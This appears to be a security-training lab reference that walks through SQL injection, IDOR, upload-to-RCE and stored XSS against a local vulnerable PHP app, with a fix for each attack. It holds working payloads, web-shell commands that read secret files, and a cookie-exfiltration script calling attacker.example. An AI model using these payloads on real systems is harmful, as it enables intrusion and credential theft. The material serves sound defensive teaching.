# Attack reference — payloads, commands and fixes

All commands assume the lab is running and you are in the repository root.
These payloads are for the local training build only.

```bash
VULN=http://localhost:8080
SECURE=http://localhost:8081
```

A small helper used by the secure-build checks:

```bash
secure_login() {
  local jar=$1
  local username=$2
  local password=$3
  local token
  token=$(curl -s -c "$jar" "$SECURE/index.php" \
    | grep -m1 -o 'name="csrf_token" value="[^"]*"' \
    | sed 's/.*value="//; s/"$//')
  curl -s -b "$jar" -c "$jar" \
    --data-urlencode "username=$username" \
    --data-urlencode "password=$password" \
    --data-urlencode "csrf_token=$token" \
    "$SECURE/index.php" -o /dev/null
}
```

> The two apps use different session cookie names (`PULSE_SID` and
> `PULSE_SID2`), so you can be signed in to both at once. Use separate
> browser profiles for the Alice and Admin views.

---

## 1. SQL injection — authentication bypass

### Browser

1. Open <http://localhost:8080/index.php>.
2. Username: `admin' -- -`
3. Password: `anything`
4. Submit. You are signed in as the admin account.
5. Open <http://localhost:8080/admin.php> and confirm the admin console and
   registered user table are accessible.

Other useful payloads:

```text
' OR 1=1 -- -
' OR '1'='1' -- -
```

### curl

```bash
curl -i -c /tmp/vuln-admin.jar \
  --data-urlencode "username=admin' -- -" \
  --data-urlencode "password=wrong" \
  "$VULN/index.php"

curl -b /tmp/vuln-admin.jar "$VULN/admin.php"
```

Expected result: `HTTP/1.1 302 Found` to `/dashboard.php`. The admin console at
`/admin.php` then shows the registered user table. Access is the proof; there is
no flag to collect.

### Why it works

The vulnerable query is:

```php
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password' LIMIT 1";
```

The payload produces:

```sql
SELECT * FROM users WHERE username = 'admin' -- -' AND password = 'wrong' LIMIT 1
```

`-- ` comments out the rest of the line. The query returns the admin row and
the application creates an admin session without ever checking the password.
Because passwords are stored in plaintext in this build, a normal login with
`admin` / `Admin123!` also works; the injection is not required.

### Secure build

```bash
TOKEN=$(curl -s -c /tmp/secure-sqli.jar "$SECURE/index.php" \
  | grep -m1 -o 'name="csrf_token" value="[^"]*"' \
  | sed 's/.*value="//; s/"$//')

curl -s -b /tmp/secure-sqli.jar -c /tmp/secure-sqli.jar \
  --data-urlencode "username=admin' -- -" \
  --data-urlencode "password=wrong" \
  --data-urlencode "csrf_token=$TOKEN" \
  "$SECURE/index.php" \
  | grep -o 'Invalid username or password.' | head -n1
```

Expected: `Invalid username or password.` The query is parameterised, the
password is verified with `password_verify()`, and the error message does not
reveal which field was wrong.

### Fix

```php
$stmt = db()->prepare('SELECT * FROM users WHERE username = ? LIMIT 1');
$stmt->execute([$username]);
$user = $stmt->fetch();

$valid = $user !== false && password_verify($password, (string) $user['password']);
```

- Use prepared statements with bound parameters.
- Hash passwords with `password_hash()`; verify with `password_verify()`.
- Return a generic login error.
- Regenerate the session id after a successful login.

---

## 2. IDOR — reading another user's profile

### Browser

1. Sign in as `alice` / `Password123!` on <http://localhost:8080>.
2. Open **My profile**. Note the URL: `/profile.php?id=2`.
3. Change the id to `3` (Bob): `/profile.php?id=3`.
4. Bob's private note contains `Backup email: bob.private@example.com` and
   `Phone: +254 712 345 678`.
5. Try `1` (admin) and `4` (Carol). The whole user table is reachable.

### curl

```bash
curl -c /tmp/alice.jar \
  -d 'username=alice&password=Password123!' \
  "$VULN/index.php" -o /dev/null

curl -b /tmp/alice.jar "$VULN/profile.php?id=3"
```

### Why it works

The page trusts the `id` parameter and performs no ownership check:

```php
$id = isset($_GET['id']) ? (int) $_GET['id'] : (int) $me['id'];
$stmt = db()->query("SELECT * FROM users WHERE id = {$id} LIMIT 1");
$user = $stmt->fetch();
```

The id is cast to an integer, so this is not SQL injection. It is a broken
object-level authorization bug: the signed-in user is allowed to ask for any
record.

### Secure build

```bash
secure_login /tmp/secure-alice.jar alice Password123!

curl -s -o /dev/null -w '%{http_code}\n' \
  -b /tmp/secure-alice.jar "$SECURE/profile.php?id=3"
```

Expected: `403`. The secure page first compares the requested id with the
session user id:

```php
$requestedId = isset($_GET['id']) ? (int) $_GET['id'] : (int) $me['id'];
$isOwner = $requestedId === (int) $me['id'];

if (!$isOwner && !is_admin($me)) {
    http_response_code(403);
    exit;
}
```

Private notes are shown only to the owner, even when an administrator is
viewing the profile.

### Fix

- Enforce object-level authorization on the server for every read and write.
- Do not rely on hidden links or unguessable ids.
- Apply least privilege: admin access to a profile does not imply access to the
  private note.
- Return `403` rather than silently rendering an empty page.

---

## 3. File upload → remote code execution

### The filter in the vulnerable build

```php
$filename  = basename((string) $file['name']);
$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp'];

if (!in_array($extension, $allowedExtensions, true)) {
    // reject
}

move_uploaded_file($file['tmp_name'], __DIR__ . '/uploads/' . $filename);
```

It checks the final extension and nothing else. The original filename is kept.
`shell.php.jpg` ends in `jpg`, so it passes. The vulnerable Apache config maps
names containing `.php` before the final extension to PHP.

### Browser

```bash
cp payloads/shell.php /tmp/shell.php.jpg
```

1. Sign in as Alice on 8080.
2. Open **My profile**.
3. Upload `/tmp/shell.php.jpg`.
4. Visit:

   ```text
   http://localhost:8080/uploads/shell.php.jpg?cmd=id
   ```

   Expected: `RCE_OK` and a `uid=33(www-data)` line.
5. Read the application secrets:

   ```text
   http://localhost:8080/uploads/shell.php.jpg?cmd=cat%20/srv/pulse/.env
   ```

### curl

```bash
curl -c /tmp/alice.jar \
  -d 'username=alice&password=Password123!' \
  "$VULN/index.php" -o /dev/null

curl -b /tmp/alice.jar \
  -F 'avatar=@payloads/shell.php;filename=shell.php.jpg;type=image/jpeg' \
  "$VULN/upload.php"

curl "$VULN/uploads/shell.php.jpg?cmd=id"
curl "$VULN/uploads/shell.php.jpg?cmd=cat%20/srv/pulse/.env"
```

Expected:

```text
RCE_OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
APP_ENV=production
PAYMENT_API_KEY=pk_live_51H8xQ2LkdIw9pQ3eZ7vN4rT6yU1mB5cA
```

### Null bytes and double extensions

- **Double extension:** `shell.php.jpg` passes a last-extension allowlist. Some
  server configurations (including this lab's vulnerable Apache setup) execute
  it as PHP. This is why renaming an upload is not enough; the fix is to
  generate the filename and make the upload directory non-executable.
- **Null byte:** `shell.php%00.jpg` was a classic bypass on PHP versions before
  5.3.4, because the runtime truncated the path at the null byte. Modern PHP
  rejects null bytes in file paths, so that exact trick does not work here. The
  vulnerable code still fails to reject null bytes explicitly; do not rely on
  the runtime to save you.
- **Content checks matter:** a valid image file can still contain PHP code in
  comments or metadata. Re-encoding images server-side is stronger than trusting
  a MIME check.

### Secure build

The secure upload rejects the PHP payload because it inspects the real content:

```bash
secure_login /tmp/secure-alice.jar alice Password123!

TOKEN=$(curl -s -b /tmp/secure-alice.jar -c /tmp/secure-alice.jar \
  "$SECURE/profile.php?id=2" \
  | grep -m1 -o 'name="csrf_token" value="[^"]*"' \
  | sed 's/.*value="//; s/"$//')

curl -b /tmp/secure-alice.jar -c /tmp/secure-alice.jar \
  -F 'avatar=@payloads/shell.php;filename=shell.php.jpg;type=image/jpeg' \
  -F "csrf_token=$TOKEN" \
  "$SECURE/upload.php" -o /dev/null -w '%{http_code}\n'

curl -s -o /dev/null -w '%{http_code}\n' "$SECURE/uploads/shell.php.jpg"
```

Expected: the upload redirects (`302`) after showing an error, and the file
itself is not stored (`404`). A real PNG is accepted and stored under a random
name.

### Fix

```php
$allowed = [
    'image/jpeg' => 'jpg',
    'image/png'  => 'png',
    'image/gif'  => 'gif',
    'image/webp' => 'webp',
];

$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime  = $finfo->file((string) $file['tmp_name']);
$imageInfo = @getimagesize((string) $file['tmp_name']);

if (!is_string($mime) || !isset($allowed[$mime]) || $imageInfo === false) {
    // reject
}

$newName = bin2hex(random_bytes(16)) . '.' . $allowed[$mime];
move_uploaded_file((string) $file['tmp_name'], __DIR__ . '/uploads/' . $newName);
@chmod(__DIR__ . '/uploads/' . $newName, 0644);
```

Defence in depth:

- Generate the filename and extension; never trust the client's name.
- Validate the real content (`finfo`, `getimagesize`), not just the extension.
- Enforce a size limit and reject unexpected error codes.
- Store uploads outside the webroot, or disable script execution in the upload
  directory (`php_flag engine off` plus a deny rule).
- Re-encode images if your product can tolerate it.
- Consider malware scanning for documents and archives.

---

## 4. Stored XSS — session theft

### Browser

1. Sign in as Alice on 8080.
2. Open **Feedback**.
3. Submit:

   ```html
   <script>alert(document.cookie)</script>
   ```

4. In a separate Admin browser profile, open **Feedback**.
5. The alert shows the admin's `PULSE_SID` session cookie.
6. Copy the cookie value. In a fresh incognito window, open DevTools →
   Application → Cookies, set `PULSE_SID` to the copied value, and reload.
   You are now signed in as the admin.

A more realistic payload would exfiltrate the cookie instead of showing it:

```html
<script>
fetch('https://attacker.example/collect?c=' + encodeURIComponent(document.cookie));
</script>
```

Use a harmless local listener or just explain the technique; do not send lab
cookies to a third party.

### curl

```bash
curl -c /tmp/alice.jar \
  -d 'username=alice&password=Password123!' \
  "$VULN/index.php" -o /dev/null

curl -b /tmp/alice.jar \
  --data-urlencode 'message=<script>alert(document.cookie)</script>' \
  "$VULN/feedback.php" -o /dev/null

curl -b /tmp/alice.jar "$VULN/feedback.php" \
  | grep -o '<script>alert(document.cookie)</script>'
```

Expected: the raw script tag is present in the response.

### Why it works

```php
<p><?= $item['message'] ?></p>
```

The message is stored exactly as submitted and rendered into the HTML page. The
browser cannot tell it apart from a legitimate script. The vulnerable session
cookie is also missing `HttpOnly`, so JavaScript can read it.

### Secure build

```bash
secure_login /tmp/secure-alice.jar alice Password123!

TOKEN=$(curl -s -b /tmp/secure-alice.jar -c /tmp/secure-alice.jar \
  "$SECURE/feedback.php" \
  | grep -m1 -o 'name="csrf_token" value="[^"]*"' \
  | sed 's/.*value="//; s/"$//')

curl -b /tmp/secure-alice.jar -c /tmp/secure-alice.jar \
  --data-urlencode 'message=<script>alert("secure-xss")</script>' \
  --data-urlencode "csrf_token=$TOKEN" \
  "$SECURE/feedback.php" -o /dev/null

curl -b /tmp/secure-alice.jar "$SECURE/feedback.php" \
  | grep -o '&lt;script&gt;alert(&quot;secure-xss&quot;)&lt;/script&gt;' | head -n1
```

Expected: the escaped string, not a live script tag. The response also carries
a Content Security Policy and the session cookie is `HttpOnly`.

### Fix

```php
<p><?= e($item['message']) ?></p>
```

```php
function e(mixed $value): string
{
    return htmlspecialchars((string) $value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}
```

Defence in depth:

- Encode for the output context (HTML, attribute, JavaScript, URL, CSS).
- Add a restrictive Content Security Policy; do not rely on it as the only fix.
- Set `HttpOnly` and `SameSite` on session cookies so XSS cannot directly read
  the session id.
- Regenerate the session id on login; expire sessions.
- Store feedback as text, not as trusted markup.
- If rich text is a requirement, use a maintained HTML sanitizer with an
  allow-list, not a blocklist of tags.

---

## Quick remediation map

| Vulnerability | Vulnerable pattern | Secure pattern |
| --- | --- | --- |
| SQL injection | String interpolation into SQL | Prepared statement + bound parameters |
| IDOR | `$_GET['id']` used without authorization | Session ownership check + role policy |
| Upload RCE | Last-extension allowlist, original filename, executable directory | `finfo` + `getimagesize`, random name, non-executable directory |
| Stored XSS | Raw echo into HTML | `htmlspecialchars()` + CSP + `HttpOnly` cookies |
| Password storage | Plaintext | `password_hash()` / `password_verify()` |
| Session fixation | No id rotation | `session_regenerate_id(true)` |
| CSRF | No token | Per-session token + `hash_equals()` + `SameSite` |
| Verbose errors | SQL exceptions rendered | Generic user message, details in logs |
| Excess privilege | Admin can read private notes | Least privilege + explicit ownership checks |

---

## Reset the lab

```bash
make reset
```

This removes the database volume, rebuilds both images and starts from the
seeded state. Uploaded files baked into the containers are discarded.
